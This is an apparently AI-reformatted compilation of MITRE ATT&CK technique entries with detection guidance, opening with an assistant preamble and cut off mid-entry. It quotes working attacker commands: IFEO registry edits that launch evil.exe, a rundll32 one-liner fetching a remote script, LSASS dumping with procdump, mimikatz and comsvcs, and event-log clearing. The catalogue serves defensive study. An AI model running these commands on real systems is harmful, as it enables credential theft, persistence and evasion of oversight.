Certainly! Below is the optimized and refined version of the provided text, with a focus on clarity, coherence, and professionalism:

---

### Exfiltration Over Bluetooth

**Created:** 2020-03-09T17:07:57.392Z  
**Modified:** 2022-03-08T21:02:15.802Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.1  
**External References:** [T1011.001](https://attack.mitre.org/techniques/T1011/001) (Mitre-Attack)  
**Kill Chain Phases:** Exfiltration (Mitre-Attack)  
**Platforms:** Linux, macOS, Windows  
**Data Sources:** Network Traffic: Network Connection Creation, Network Traffic Content, Network Traffic Flow, Command: Command Execution, File: File Access  

**Description:**
Adversaries may attempt to exfiltrate data over Bluetooth rather than using the primary command and control (C2) channel. If the C2 network is a wired Internet connection, adversaries might opt to exfiltrate data via a Bluetooth communication channel. This method may be chosen if the adversary has sufficient access and proximity to the target. Bluetooth connections are often less secured or defended compared to the primary Internet-connected channel because they do not route through the same enterprise network.

**Detection:**
Monitor for processes that utilize the network but do not normally have network communication or have never been seen before. Processes that typically require user-driven events to access the network (e.g., a web browser opening with a mouse click or key press) but access the network without such events may be malicious. Additionally, monitor for and investigate changes to host adapter settings, such as the addition or replication of communication interfaces.

---

### Default Accounts

**Created:** 2020-03-13T20:15:31.974Z  
**Modified:** 2023-03-30T21:01:44.382Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.2  
**External References:** [T1078.001](https://attack.mitre.org/techniques/T1078/001) (Mitre-Attack)  
**Kill Chain Phases:** Defense Evasion, Persistence, Privilege Escalation, Initial Access (Mitre-Attack)  
**Platforms:** Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers  
**Permissions Required:** Administrator, User  
**Data Sources:** User Account: User Account Authentication, Logon Session: Logon Session Creation  

**Description:**
Adversaries may obtain and abuse credentials of default accounts to gain initial access, persistence, privilege escalation, or defense evasion. Default accounts include those built into an OS, such as the Guest or Administrator accounts on Windows systems, and default factory/provider set accounts on other systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes. Default accounts are not limited to client machines; they also include preset accounts for equipment like network devices and computer applications, whether internal, open source, or commercial.

Appliances that come with preset username and password combinations pose a significant threat to organizations that do not change them post-installation, as they are easy targets for adversaries. Adversaries may also use publicly disclosed or stolen private keys or credential materials to connect to remote environments via Remote Services.

**Detection:**
Monitor for activations or logins to default accounts. Regularly audit appliances and applications for default credentials or SSH keys, and update them immediately if discovered.

---

### Time Providers

**Created:** 2020-01-24T15:51:52.317Z  
**Modified:** 2022-04-20T16:31:16.715Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1547.003](https://attack.mitre.org/techniques/T1547/003) (Mitre-Attack)  
**Kill Chain Phases:** Persistence, Privilege Escalation (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** SYSTEM, Administrator  
**Data Sources:** Process: Process Creation, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Module: Module Load  

**Description:**
Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. Time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.

Time providers are implemented as dynamic-link libraries (DLLs) registered in the subkeys of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.

Adversaries may abuse this architecture to establish persistence by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in the context of the Local Service account.

**Detection:**
Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including API calls such as RegCreateKeyEx and RegSetValueEx, as well as the execution of the W32tm.exe utility. There is no restriction on the number of custom time provider registrations, though each may require a DLL payload written to disk. The Sysinternals Autoruns tool can also be used to analyze auto-starting locations, including DLLs listed as time providers.

---

### Image File Execution Options Injection

**Created:** 2018-01-16T16:13:52.465Z  
**Modified:** 2020-11-10T18:29:30.417Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1183](https://attack.mitre.org/techniques/T1183) (Mitre-Attack)  
**Kill Chain Phases:** Privilege Escalation, Persistence, Defense Evasion (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** Administrator, SYSTEM  
**Data Sources:** Process: Process Creation, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Module: Module Load  

**Description:**
Image File Execution Options (IFEO) enable developers to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger. IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where  is the binary on which the debugger is attached.

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits. Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.

An example where the evil.exe process is started when notepad.exe exits:
- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512`
- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1`
- `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"`

These values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. Installing IFEO mechanisms may also provide persistence via continuous invocation. Malware may also use IFEO for defense evasion by registering invalid debuggers that redirect and effectively disable various system and security applications.

**Detection:**
Monitor for common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as DEBUG_PROCESS and DEBUG_ONLY_THIS_PROCESS. Monitor Registry values associated with IFEOs and silent process exit monitoring for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze API calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx.

---

### Rundll32

**Created:** 2017-05-31T21:31:06.045Z  
**Modified:** 2020-01-31T19:01:41.919Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.1  
**External References:** [T1085](https://attack.mitre.org/techniques/T1085) (Mitre-Attack)  
**Kill Chain Phases:** Defense Evasion, Execution (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** User  
**Data Sources:** Process: Process Creation, Command: Command Execution, File: File Access  

**Description:**
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process due to whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:"\..mshtml,RunHTMLApplication ";document.write();GetObject("script:https://www.example.com/malicious.sct")`. This behavior has been seen used by malware such as Poweliks.

**Detection:**
Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.

---

### Modify Existing Service

**Created:** 2017-05-31T21:30:34.928Z  
**Modified:** 2020-03-16T16:05:53.825Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1031](https://attack.mitre.org/techniques/T1031) (Mitre-Attack)  
**Kill Chain Phases:** Persistence (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** Administrator, SYSTEM  
**Data Sources:** Process: Process Creation, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Module: Module Load  

**Description:**
Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and Reg.

Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of masquerading that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.

Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands.

**Detection:**
Look for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence. Service information is stored in the Registry at HKLM\\SYSTEM\\CurrentControlSet\\Services. Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute cmd commands or scripts. Look for abnormal process call trees from known services and for execution of other commands that could relate to discovery or other adversary techniques. Services may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.

---

### Trap

**Created:** 2020-01-24T14:17:43.906Z  
**Modified:** 2020-03-24T16:43:02.273Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1546.005](https://attack.mitre.org/techniques/T1546/005) (Mitre-Attack)  
**Kill Chain Phases:** Privilege Escalation, Persistence (Mitre-Attack)  
**Platforms:** macOS, Linux  
**Permissions Required:** User, Administrator  
**Data Sources:** File: File Creation, File: File Modification, Process: Process Creation, Command: Command Execution  

**Description:**
Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.

Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format: `trap 'command list' signals` where "command list" will be executed when "signals" are received.

**Detection:**
Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.

---

### Dynamic Linker Hijacking

**Created:** 2020-03-13T20:09:59.569Z  
**Modified:** 2023-03-30T21:01:40.146Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 2.0  
**External References:** [T1574.006](https://attack.mitre.org/techniques/T1574/006) (Mitre-Attack)  
**Kill Chain Phases:** Persistence, Privilege Escalation, Defense Evasion (Mitre-Attack)  
**Platforms:** Linux, macOS  
**Permissions Required:** User  
**Data Sources:** Command: Command Execution, File: File Creation, Module: Module Load, Process: Process Creation, File: File Modification  

**Description:**
Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.

On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function. Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher-level syntax such as Python’s os.environ.

On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file. Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.

On macOS, this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the DYLD_INSERT_LIBRARIES environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.

**Detection:**
Monitor for changes to environment variables and files associated with loading shared libraries such as LD_PRELOAD and DYLD_INSERT_LIBRARIES, as well as the commands to implement these changes. Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.

---

### Local Account

**Created:** 2020-01-28T13:50:22.506Z  
**Modified:** 2023-04-12T23:23:35.209Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.2  
**External References:** [T1136.001](https://attack.mitre.org/techniques/T1136/001) (Mitre-Attack)  
**Kill Chain Phases:** Persistence (Mitre-Attack)  
**Platforms:** Linux, macOS, Windows, Network  
**Permissions Required:** Administrator, User  
**Data Sources:** User Account: User Account Creation, Command: Command Execution, Process: Process Creation  

**Description:**
Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the net user /add command can be used to create a local account. On macOS systems, the dscl -create command can be used to create a local account. Local accounts may also be added to network devices, often via common Network Device CLI commands such as username.

Such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.

**Detection:**
Monitor for processes and command-line parameters associated with local account creation, such as net user /add, useradd, and dscl -create. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary. For network infrastructure devices, collect AAA logging to monitor for account creations.

---

### Communication Through Removable Media

**Created:** 2017-05-31T21:31:09.379Z  
**Modified:** 2020-07-14T19:44:50.871Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1092](https://attack.mitre.org/techniques/T1092) (Mitre-Attack)  
**Kill Chain Phases:** Command and Control (Mitre-Attack)  
**Platforms:** Linux, macOS, Windows  
**Data Sources:** Drive: Drive Creation, Drive: Drive Access  

**Description:**
Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.

**Detection:**
Monitor file access on removable media. Detect processes that execute when removable media is mounted.

---

### Clear Windows Event Logs

**Created:** 2020-01-28T17:05:14.707Z  
**Modified:** 2023-04-12T15:32:03.205Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.2  
**External References:** [T1070.001](https://attack.mitre.org/techniques/T1070/001) (Mitre-Attack)  
**Kill Chain Phases:** Defense Evasion (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** Administrator  
**Data Sources:** Command: Command Execution, Process: OS API Execution, File: File Deletion  

**Description:**
Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

The event logs can be cleared with the following utility commands:
- `wevtutil cl system`
- `wevtutil cl application`
- `wevtutil cl security`

These logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell. For example, adversaries may use the PowerShell command `Remove-EventLog -LogName Security` to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.

**Detection:**
Deleting Windows event logs (via native binaries, API functions, or PowerShell) may also generate an alterable event (Event ID 1102: "The audit log was cleared").

---

### Email Accounts

**Created:** 2020-10-01T01:09:53.217Z  
**Modified:** 2021-04-15T03:09:59.862Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1585.002](https://attack.mitre.org/techniques/T1585/002) (Mitre-Attack)  
**Kill Chain Phases:** Resource Development (Mitre-Attack)  
**Platforms:** PRE  
**Data Sources:** None  

**Description:**
Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. Adversaries may also take steps to cultivate a persona around the email account, such as through the use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (e.g., Domains).

To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.

**Detection:**
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (e.g., Phishing).

---

### LLMNR/NBT-NS Poisoning and SMB Relay

**Created:** 2020-02-11T19:08:51.677Z  
**Modified:** 2022-10-25T15:46:55.393Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.4  
**External References:** [T1557.001](https://attack.mitre.org/techniques/T1557/001) (Mitre-Attack)  
**Kill Chain Phases:** Credential Access, Collection (Mitre-Attack)  
**Platforms:** Windows  
**Data Sources:** Windows Registry: Windows Registry Key Modification, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content, Service: Service Creation  

**Description:**
By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary-controlled system. This activity may be used to collect or relay authentication materials.

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary-controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary-controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary-controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL, and HTTP, to expand and use multiple services with the valid NTLM response.

Several tools may be used to poison name services within local networks, such as NBNSpoof, Metasploit, and Responder.

**Detection:**
Monitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the "EnableMulticast" DWORD value. A value of "0" indicates LLMNR is disabled. Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy. Deploy an LLMNR/NBT-NS spoofing detection tool. Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.

---

### File and Directory Permissions Modification

**Created:** 2018-10-17T00:14:20.652Z  
**Modified:** 2022-10-19T17:54:06.038Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 2.2  
**External References:** [T1222](https://attack.mitre.org/techniques/T1222) (Mitre-Attack)  
**Kill Chain Phases:** Defense Evasion (Mitre-Attack)  
**Platforms:** Linux, Windows, macOS  
**Data Sources:** Active Directory: Active Directory Object Modification, Command: Command Execution, Process: Process Creation, File: File Metadata  

**Description:**
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, Unix Shell Configuration Modification, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.

Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.

**Detection:**
Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.

---

### LSASS Memory

**Created:** 2020-02-11T18:41:44.783Z  
**Modified:** 2023-04-03T18:54:21.492Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.2  
**External References:** [T1003.001](https://attack.mitre.org/techniques/T1003/001) (Mitre-Attack)  
**Kill Chain Phases:** Credential Access (Mitre-Attack)  
**Platforms:** Windows  
**Data Sources:** Process: Process Creation, Command: Command Execution, Process: Process Access, Process: OS API Execution  

**Description:**
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host, use procdump:
- `procdump -ma lsass.exe lsass_dump`

Locally, mimikatz can be run using:
- `sekurlsa::Minidump lsassdump.dmp`
- `sekurlsa::logonPasswords`

Built-in Windows tools such as comsvcs.dll can also be used:
- `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full`

Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.

The following SSPs can be used to access credentials:
- Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
- Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
- Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
- CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.

**Detection:**
Monitor for unexpected processes interacting with LSASS.exe. Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.

---

### At (Linux)

**Created:** 2019-12-03T12:59:36.749Z  
**Modified:** 2022-04-16T20:45:01.814Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.1  
**External References:** [T1053.001](https://attack.mitre.org/techniques/T1053/001) (Mitre-Attack)  
**Kill Chain Phases:** Execution, Persistence, Privilege Escalation (Mitre-Attack)  
**Platforms:** Linux  
**Remote Support:** True  
**Data Sources:** None  

**Description:**
Adversaries may abuse the at utility to perform task scheduling for initial, recurring, or future execution of malicious code. The at command within Linux operating systems enables administrators to schedule tasks.

An adversary may use at in Linux environments to execute programs at system startup or on a scheduled basis for persistence. at can also be abused to conduct remote execution as part of Lateral Movement and/or to run a process under the context of a specified account.

Adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via sudo.

**Detection:**
Monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. Review all jobs using the atq command and ensure IP addresses stored in the SSH_CONNECTION and SSH_CLIENT variables, machines that created the jobs, are trusted hosts. All at jobs are stored in /var/spool/cron/atjobs/.

Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.

---

### Hooking

**Created:** 2018-01-16T16:13:52.465Z  
**Modified:** 2020-11-10T18:29:30.516Z  
**ID:** attack-  
**Type:** attack-pattern  
**Version:** 1.0  
**External References:** [T1179](https://attack.mitre.org/techniques/T1179) (Mitre-Attack)  
**Kill Chain Phases:** Persistence, Privilege Escalation, Credential Access (Mitre-Attack)  
**Platforms:** Windows  
**Permissions Required:** Administrator, SYSTEM  
**Data Sources:** None  

**Description:**
Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions.

Hooking involves redirecting calls to these functions and can be implemented via:
- **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.
- **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.
- **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.

Similar to Process Injection, adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.

Malicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for